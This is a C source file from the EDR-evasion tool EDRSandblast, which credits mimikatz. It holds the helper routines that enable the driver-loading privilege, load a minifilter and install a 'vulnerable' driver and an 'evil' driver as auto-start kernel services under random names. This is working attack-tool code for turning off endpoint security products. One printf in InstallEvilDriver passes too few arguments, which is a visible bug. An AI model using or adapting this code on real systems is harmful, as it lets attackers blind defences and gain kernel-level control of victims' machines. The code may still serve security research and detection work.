/*

--- Driver install / uninstall functions.
--- Source and credit: https://github.com/gentilkiwi/mimikatz

*/
#include <Windows.h>
#include <aclapi.h>
#include <Shlwapi.h>
#include <Tchar.h>
#include <time.h>
#include <fltUser.h>
#include "DriverOps.h"

#include "../EDRSandblast.h"
#include "StringUtils.h"
#include "WindowsServiceOps.h"
/*

--- Vulnerable driver install / uninstall functions.

*/


TCHAR* g_driverServiceName;

HRESULT startFlt(LPCWSTR filterName) {
    // thanks this thread : https://community.osr.com/discussion/79753/filterload-in-a-service
    // and doc https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
    HRESULT res=0x00000000;
    HANDLE hToken; // process token
    TOKEN_PRIVILEGES tp; // token provileges
    TOKEN_PRIVILEGES oldtp; // old token privileges
    DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |
        TOKEN_QUERY, &hToken))
    {
        return GetLastError();
    }
    if (!LookupPrivilegeValue(NULL, _T("SeLoadDriverPrivilege"), &luid))
    //if (!LookupPrivilegeValue(NULL, privilegeStr, &luid))
    {
        DWORD dwRet = GetLastError();
        CloseHandle(hToken);
        _putts_or_not(TEXT("[!] Error LookupPrivilege : Value SeLoadDriverPrivilege not found (%u)"), dwRet);
        return dwRet;
    }

    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // SE_LOAD_DRIVER_NAME

    // Adjust Token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
        &oldtp, &dwSize))
    {
        DWORD dwRet = GetLastError();
        CloseHandle(hToken);
        _putts_or_not(TEXT("[!] Error AdjustTokenPrivileges : Value SeLoadDriverPrivilege not found"));
        return dwRet;
    }
    CloseHandle(hToken);
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        _putts_or_not(TEXT("[!] The token does not have the specified privilege. \n"));
        return FALSE;
    }
    //_putts_or_not(TEXT("[+] The token is adjusted with SeLoadDriverPrivilege privilege. \n"));

    // Load the minifilter driver
    res = FilterLoad(filterName);
    //_tprintf_or_not(TEXT("[+] FilterLoad result : 0x%08X \n"), res);

    return res;
}

TCHAR* GetDriverServiceName(void) {
    if (!g_driverServiceName || _tcslen(g_driverServiceName) == 0) {
        g_driverServiceName = allocAndGenerateRandomString(SERVICE_NAME_LENGTH);
    }
    return g_driverServiceName;
}

void SetDriverServiceName(_In_z_ TCHAR *newName) {
    if (g_driverServiceName) {
        free(g_driverServiceName);
    }
    g_driverServiceName = _tcsdup(newName);

    if (!g_driverServiceName) {
        _putts_or_not(TEXT("[!] Error while attempting to set the service name."));
        return;
    }
}

BOOL InstallVulnerableDriver(TCHAR* driverPath) {
    TCHAR* svcName = GetDriverServiceName();

    DWORD status = ServiceInstall(svcName, svcName, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    if (status == 0x00000005) {
        _putts_or_not(TEXT("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?"));
    }

    return status == 0x0;
}

BOOL UninstallVulnerableDriver(void) {
    TCHAR* svcName = GetDriverServiceName();

    BOOL status = ServiceUninstall(svcName, 0);
    
    if (!status) {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
    }

    return status;
}

BOOL IsDriverServiceRunning(LPTSTR driverPath, LPTSTR* serviceName) {
    SC_HANDLE hSCM = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    BOOL isRunning = FALSE;
    if (hSCM) {
        DWORD cbBufSize, cbBytesNeeded;
        DWORD nbServices;
        BOOL bRes = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &cbBytesNeeded, &nbServices, NULL, NULL);
        if (!bRes && GetLastError() == ERROR_MORE_DATA) {
            ENUM_SERVICE_STATUS_PROCESS* services = calloc(1, cbBytesNeeded);
            if (services){
                cbBufSize = cbBytesNeeded;
                bRes = EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL, (LPBYTE)services, cbBufSize, &cbBytesNeeded, &nbServices, NULL, NULL);
                if (bRes) {
                    for (DWORD i = 0; i < nbServices; i++) {
                        SC_HANDLE hS = OpenService(hSCM, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
                        if (hS && _tcscmp(services[i].lpServiceName, GetDriverServiceName())) {
                            bRes = QueryServiceConfig(hS, NULL, 0, &cbBytesNeeded);
                            if (!bRes && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                                QUERY_SERVICE_CONFIG* serviceConfig = calloc(1, cbBytesNeeded);
                                if (serviceConfig) {
                                    cbBufSize = cbBytesNeeded;
                                    bRes = QueryServiceConfig(hS, serviceConfig, cbBufSize, &cbBytesNeeded);
                                    if (bRes) {
                                        if (!_tcscmp(PathFindFileName(serviceConfig->lpBinaryPathName), PathFindFileName(driverPath))) {
                                            isRunning = TRUE;
                                            if (serviceName) {
                                                *serviceName = _tcsdup(services[i].lpServiceName);
                                            }
                                            _tprintf_or_not(TEXT("[!] The service %s already started %s\n"), serviceConfig->lpDisplayName, PathFindFileName(serviceConfig->lpBinaryPathName));
                                            _tprintf_or_not(TEXT("[!] If needed, you can manually stop / delete : \ncmd /c sc stop %s\ncmd /c sc delete %s\n"), serviceConfig->lpDisplayName, serviceConfig->lpDisplayName);
                                        }
                                    }
                                    free(serviceConfig);
                                }
                            }
                            CloseServiceHandle(hS);
                        }
                    }
                }
                free(services);
            }
        }
        CloseServiceHandle(hSCM);
    }
    else {
        PRINT_ERROR_AUTO(TEXT("OpenSCManager(create)"));
        return FALSE;
    }
    return isRunning;
}

/*

--- Evil driver install / uninstall functions.

*/

TCHAR* g_evilDriverServiceName;

TCHAR* GetEvilDriverServiceName(void) {
    if (!g_evilDriverServiceName || _tcslen(g_evilDriverServiceName) == 0) {
        g_evilDriverServiceName = allocAndGenerateRandomString(SERVICE_NAME_LENGTH);
    }
    return g_evilDriverServiceName;
}

void SetEvilDriverServiceName(_In_z_ TCHAR* newName) {
    if (g_evilDriverServiceName) {
        free(g_evilDriverServiceName);
    }
    g_evilDriverServiceName = _tcsdup(newName);

    if (!g_evilDriverServiceName) {
        _putts_or_not(TEXT("[!] Error while attempting to set the service name."));
        return;
    }
}

BOOL InstallEvilDriver(TCHAR* driverPath) {
    TCHAR* svcName = GetEvilDriverServiceName();
    DWORD status = ServiceInstall(svcName, svcName, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    if (status == 0x00000005) {
        _putts_or_not(TEXT("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?"));
    }
    _tprintf_or_not(TEXT("[!] The evil service should be manually deleted when you are done with it : \ncmd /c sc stop %s\ncmd /c sc delete %s\n"), GetEvilDriverServiceName());

    return status == 0x0;
}

BOOL UninstallEvilDriver(void) {
    TCHAR* svcName = GetEvilDriverServiceName();
    
    BOOL status = ServiceUninstall(svcName, 0);

    if (!status) {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
    }

    return status;
}